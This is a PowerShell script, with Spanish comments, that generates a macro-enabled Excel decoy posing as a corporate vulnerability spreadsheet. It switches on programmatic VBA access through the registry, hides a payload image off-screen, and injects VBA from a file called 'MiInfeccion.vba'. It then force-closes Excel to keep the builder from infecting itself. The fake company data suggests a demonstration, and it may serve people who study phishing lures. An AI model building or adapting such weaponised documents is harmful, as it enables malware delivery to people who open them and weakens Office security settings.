$base = $PSScriptRoot+"\";
if($base -eq "\"){$base = ".\"}

$output = ($base + "output\" | Resolve-Path).Path;
$payloads = ($base + "payloads\" | Resolve-Path).Path;

if((Test-Path $output) -eq $false){New-Item -ItemType Directory $output}
if((Test-Path $payloads) -eq $false){New-Item -ItemType Directory $payloads}

$file_output = "Planilla de vulnerabilidades.xlsm" # Nombre del archivo final
$file_code = "MiInfeccion.vba" # Nombre del archivo con código VBA para el Excel
$file_image = "bg.jpg" # Nombre de la imagen a embeber

# Abrimos una instancia de la aplicación Excel.
$excel = New-Object -ComObject Excel.Application;
$excel.Visible = $false;
$excel.DisplayAlerts = $false

# Codigo usado la primera vez, para setear el acceso por Powershell al código de VBA de Excel.
$ExcelVersion = $excel.Version
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -Value 1 -Force | Out-Null 

$workbook = $excel.Workbooks.add();
$workbook.worksheets.Item(1).Name = "Datos";
$sheet = $workbook.worksheets.Item("Datos");

$sheet.Columns.Item(2).ColumnWidth = 5;
$sheet.Columns.Item(2).ColumnWidth = 36;
$sheet.Columns.Item(3).ColumnWidth = 13;
$sheet.Columns.Item(4).ColumnWidth = 12;

# Este es un arreglo de con los datos que se van a llenar después
$datos = @(@{
    Col = 1
    Datos = @("ID", "1", "2", "3", "4", "5", "6", "7")
},@{
    Col = 2
    Datos = @("Nombre", "critico.tuempresafalsa.cl", "critico2.tuempresafalsa.cl", "critico3.tuempresafalsa.cl", "critico4.tuempresafalsa.cl", "critico5.tuempresafalsa.cl", "critico6.tuempresafalsa.cl", "critico7.tuempresafalsa.cl")
},@{
    Col = 3
    Datos = @("IP", "10.0.10.15", "192.168.1.1", "192.168.10.11", "10.10.33.21", "192.168.10.21", "192.168.1.11", "10.0.0.10")
},@{
    Col = 4
    Datos = @("Puntaje CVSS", "9.8", "7.8", "7.5", "6.0", "5.5", "5.5", "3.0")
}
)
$sheet.Cells.Item(2,1) = "Esta planilla contiene los activos críticos de nuestra empresa que necesitan atención, si quedan activos pendientes falta realizar el llamado a nuestros servers.";

# Agregando los datos definidos en el arreglo anterior
foreach($dato in $datos){
    $i = 0;
    foreach($celda in $dato["Datos"]){
        $sheet.Cells.Item($i + 4, $dato["Col"]) = $celda;
        if($i -eq 0){
            $sheet.Cells.Item($i + 4, $dato["Col"]).Font.Bold = $true;
            $sheet.Cells.Item($i + 4, $dato["Col"]).Font.ColorIndex = 2;
            $sheet.Cells.Item($i + 4, $dato["Col"]).Interior.ColorIndex = 1
        }
        $i++;
    }
}

$sheet.Cells.Item(14,1) = "Cargando ...";
$sheet.Cells.Item(14,1).Font.Bold = $true;

# Agregando la foto de fondo de pantalla (puede ir donde sea, mientras sea 1 foto agregada en "Shapes"
$sheet.Shapes.AddPicture($payloads + $file_image, 0, -1,30000,30000,-1,-1) | Out-Null

# Agregando el código VBA que tengo en un archivo aparte.
$test = $workbook.VBProject.VBComponents.Item(1).CodeModule.AddFromFile($payloads + $file_code);

# Guardando el archivo como .xlsm
$workbook.SaveAs($output + $file_output, [Microsoft.Office.Interop.Excel.XlFileFormat]::xlOpenXMLWorkbookMacroEnabled );

# Force Close para no infectarse en la creación
$excel.Visible = $true;
$process = Get-Process Excel | Where-Object {$_.MainWindowHandle -eq $excel.Hwnd}
Stop-Process -id $process.Id
